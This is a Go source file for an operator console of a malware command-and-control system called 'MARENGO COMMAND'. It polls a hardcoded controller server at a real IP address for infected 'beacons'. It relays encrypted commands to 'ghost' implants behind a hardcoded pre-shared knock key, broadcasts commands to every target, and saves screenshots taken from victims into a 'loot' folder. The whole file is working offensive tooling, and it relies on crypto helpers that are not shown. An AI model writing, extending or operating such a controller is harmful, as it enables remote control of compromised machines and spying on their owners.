package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gdamore/tcell/v2"
	"github.com/rivo/tview"
)

// --- GLOBALS ---
var (
	app           = tview.NewApplication()
	targetList    = tview.NewList().ShowSecondaryText(false)
	outputView    = tview.NewTextView()
	logView       = tview.NewTextView()
	commandInput  = tview.NewInputField()
	currentSecret string
	uiStartTime   = time.Now() // Renamed from startTime
)

type AuthRequest struct {
	Type     string `json:"type"`
	Key      string `json:"key"`
	TargetID string `json:"target_id"`
}

type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
}

func main() {
	loginForm := tview.NewForm().
		AddPasswordField("Tenant Secret", "", 20, '*', func(text string) { currentSecret = text }).
		AddButton("Initialize Link", func() {
			if strings.TrimSpace(currentSecret) != "" {
				setupDashboard()
			}
		})
	loginForm.SetBorder(true).SetTitle(" MARENGO // AUTH ").SetTitleAlign(tview.AlignCenter)

	if err := app.SetRoot(loginForm, true).Run(); err != nil {
		panic(err)
	}
}

func setupDashboard() {
	app.EnableMouse(false)

	// --- 1. THE HEADER (High-Density Banner) ---
	header := tview.NewTextView().SetDynamicColors(true).SetTextAlign(tview.AlignCenter)

	// --- 2. NODE MATRIX (Left) ---
	targetList.SetBorder(true).SetTitle(" 🌐 NODES ").SetTitleColor(tcell.ColorSpringGreen)
	targetList.SetBackgroundColor(tcell.ColorBlack)
	targetList.SetSelectedBackgroundColor(tcell.ColorSpringGreen)
	targetList.SetSelectedTextColor(tcell.ColorBlack)

	// --- 3. TERMINAL (Center) ---
	outputView.SetDynamicColors(true).SetWordWrap(true).SetBackgroundColor(tcell.ColorBlack)
	outputView.SetBorder(true).SetTitle(" 🖥️ TERMINAL ").SetTitleColor(tcell.ColorDeepSkyBlue)

	// --- 4. TELEMETRY (Right) ---
	logView.SetDynamicColors(true).SetBorder(true).SetTitle(" 📡 LOGS ").SetTitleColor(tcell.ColorOrange)
	logView.SetBackgroundColor(tcell.ColorBlack)

	// --- 5. COMMAND INPUT ---
	commandInput.SetLabel(" [RECV_READY] ➔ ").
		SetLabelColor(tcell.ColorSpringGreen).
		SetFieldBackgroundColor(tcell.ColorBlack)
	commandInput.SetBorder(true).SetTitle(" ⌨️ EXECUTE ").SetTitleColor(tcell.ColorSpringGreen)

	// --- 6. CIRCULAR FOCUS MANAGER (The Tab Fix) ---
	// Define the rotation order
	focusOrder := []tview.Primitive{targetList, commandInput, outputView}

	app.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyTab {
			currentFocus := app.GetFocus()
			for i, primitive := range focusOrder {
				if primitive == currentFocus {
					nextIndex := (i + 1) % len(focusOrder)
					app.SetFocus(focusOrder[nextIndex])
					return nil
				}
			}
			// Default fallback
			app.SetFocus(targetList)
			return nil
		}
		return event
	})

	// --- 7. HUD UPDATER ---
	go func() {
		for {
			uptime := time.Since(uiStartTime).Round(time.Second)
			header.SetText(fmt.Sprintf(
				" [black:blue] MARENGO COMMAND [:-] [blue][-] [white]UPTIME: %s[-] [blue][-] [yellow]ACTIVE_BEACONS: %d[-] ",
				uptime, targetList.GetItemCount()-1,
			))
			time.Sleep(1 * time.Second)
			app.Draw()
		}
	}()

	// --- 8. REFRESH ENGINE (Stable) ---
	go func() {
		for {
			t := fetchTargets()
			app.QueueUpdateDraw(func() {
				currentName := ""
				if targetList.GetItemCount() > 0 {
					idx := targetList.GetCurrentItem()
					if idx >= 0 && idx < targetList.GetItemCount() {
						currentName, _ = targetList.GetItemText(idx)
					}
				}

				targetList.Clear()
				targetList.AddItem("[ALL_BROADCAST]", "Global Command", 'a', nil)

				newIdx := 0
				for _, name := range t {
					if name == "" {
						continue
					}
					displayName := "NODE::" + name
					targetList.AddItem(displayName, "Signal Active", 0, nil)
					if displayName == currentName {
						newIdx = targetList.GetItemCount() - 1
					}
				}
				targetList.SetCurrentItem(newIdx)
				fmt.Fprintf(logView, "[orange]%s[-] [white]PING[-] ➔ Brain Ack\n", time.Now().Format("15:04:05"))
			})
			time.Sleep(5 * time.Second)
		}
	}()

	// --- 9. INPUT ENGINE ---
	commandInput.SetDoneFunc(func(key tcell.Key) {
		if key == tcell.KeyEnter {
			if targetList.GetItemCount() == 0 {
				return
			}
			cmd := strings.TrimSpace(commandInput.GetText())
			if cmd == "" {
				return
			}

			idx := targetList.GetCurrentItem()
			fullText, _ := targetList.GetItemText(idx)
			targetID := strings.TrimPrefix(fullText, "NODE::")

			if cmd == "clear" {
				outputView.Clear()
				commandInput.SetText("")
				return
			}

			ts := time.Now().Format("15:04:05")
			fmt.Fprintf(outputView, "[white]%s[-] [green][TASK][-] %s ➔ %s\n", ts, targetID, cmd)

			go func(tid, command string) {
				var res string
				if tid == "[ALL_BROADCAST]" {
					broadcastCommand(command)
				} else {
					res = executeRotatingCommand(tid, command)
					fmt.Fprintf(outputView, "[white]%s[-] [blue][RECV][-] %s ➔ \n%s\n", ts, tid, formatResponse(tid, res))
				}
				app.Draw()
			}(targetID, cmd)

			commandInput.SetText("")
		}
	})

	// --- 10. OBSIDIAN LAYOUT ---
	// Vertical stack for the main center area
	centerFlex := tview.NewFlex().SetDirection(tview.FlexRow).
		AddItem(outputView, 0, 1, false).
		AddItem(commandInput, 3, 0, true)

	// Horizontal main body
	mainBody := tview.NewFlex().
		AddItem(targetList, 25, 0, false). // Nodes
		AddItem(centerFlex, 0, 1, true).   // Terminal + Input
		AddItem(logView, 30, 0, false)     // Logs

	// Final assembly
	finalLayout := tview.NewFlex().SetDirection(tview.FlexRow).
		AddItem(header, 1, 0, false).
		AddItem(mainBody, 0, 1, true)

	app.SetRoot(finalLayout, true).SetFocus(commandInput)
}

func formatResponse(id, res string) string {
	// 1. IMPROVED SNAP DETECTION
	// We search for "SNAP_DATA:" anywhere in the response
	if strings.Contains(res, "SNAP_DATA:") {
		_ = os.Mkdir("loot", 0755)

		// Split by the tag to isolate the Base64
		parts := strings.Split(res, "SNAP_DATA:")
		if len(parts) < 2 {
			return "[red]ERROR: Snap Data Tag Found but Content Missing[-]"
		}

		// Clean up the string (remove any trailing newlines/spaces)
		rawBase64 := strings.TrimSpace(parts[1])

		// DECODE
		imgBytes, err := base64.StdEncoding.DecodeString(rawBase64)
		if err != nil {
			// If decoding fails, it might be partial data.
			// Let's log the first 20 chars of the failure for debugging.
			return fmt.Sprintf("[red]DECODE_FAIL: %v (Start: %s...)[-]", err, rawBase64[:10])
		}

		timestamp := time.Now().Format("2006-01-02_15-04-05")
		fileName := fmt.Sprintf("loot/snap_%s_%s.jpg", id, timestamp)

		err = os.WriteFile(fileName, imgBytes, 0644)
		if err != nil {
			return "[red]WRITE_FAIL: " + err.Error() + "[-]"
		}

		// SUCCESS: This message replaces the wall of text
		return fmt.Sprintf("[green]📸 SNAPSHOT_STORED:[-] %s [yellow](%d KB)[-]", fileName, len(imgBytes)/1024)
	}

	// 2. Standard Whoami/Dir Formatting
	if strings.Contains(res, "[+] IDENT:") {
		res = strings.ReplaceAll(res, "[+]", "[blue][+][-]")
	}

	return res
}

// --- NETWORK LOGIC (REMAINING UNCHANGED) ---

func fetchTargets() []string {
	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
	if err != nil {
		return nil
	}
	defer c.Close()

	// Send the request
	json.NewEncoder(c).Encode(AuthRequest{Type: "cc_list", Key: currentSecret})

	var t []string
	err = json.NewDecoder(c).Decode(&t)
	if err != nil {
		return nil
	}

	return t
}

func executeRotatingCommand(id, cmd string) string {
	// 1. Get Relay Address from Brain
	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
	if err != nil {
		return "[red]Brain Unreachable[-]"
	}
	json.NewEncoder(c).Encode(AuthRequest{Type: "cc_req", TargetID: id, Key: currentSecret})
	var r RoutingInfo
	json.NewDecoder(c).Decode(&r)
	c.Close()
	if r.RelayAddr == "" {
		return "[red]Target Offline/Busy[-]"
	}

	// 2. Connect to the Relay
	conn, err := net.DialTimeout("tcp", r.RelayAddr, 5*time.Second)
	if err != nil {
		return "[red]Relay Connection Refused[-]"
	}
	defer conn.Close()

	// 3. Secret Knock
	const PSK = "8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"
	conn.Write([]byte(PSK))

	// 4. Handle Encryption (Crucial Step)
	// You MUST generate the same session key the ghost expects
	sessionKey := generateSessionKey() // This function must be in your crypto.go
	conn.Write(sessionKey)

	// 5. Send Encrypted Command
	encCmd, _ := encryptPayload(cmd, sessionKey)
	fmt.Fprintf(conn, "%s\n", encCmd)

	// 6. Read and Decrypt the Result
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	reply, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		return "[red]No response from ghost (Timeout)[-]"
	}

	// Decrypt the response before returning it to the TUI
	decryptedRes, err := decryptPayload(strings.TrimSpace(reply), sessionKey)
	if err != nil {
		return "[red]Decryption Error: " + err.Error() + "[-]"
	}

	return decryptedRes
}
func broadcastCommand(cmd string) {
	targets := fetchTargets()
	fmt.Fprintf(outputView, "[blue][*][-] Blasting to %d targets...[-]\n", len(targets))
	var wg sync.WaitGroup
	for _, id := range targets {
		wg.Add(1)
		go func(tid string) {
			defer wg.Done()
			res := executeRotatingCommand(tid, cmd)
			fmt.Fprintf(outputView, "[white][%s]:[-] %s\n", tid, res)
		}(id)
	}
	wg.Wait()
}
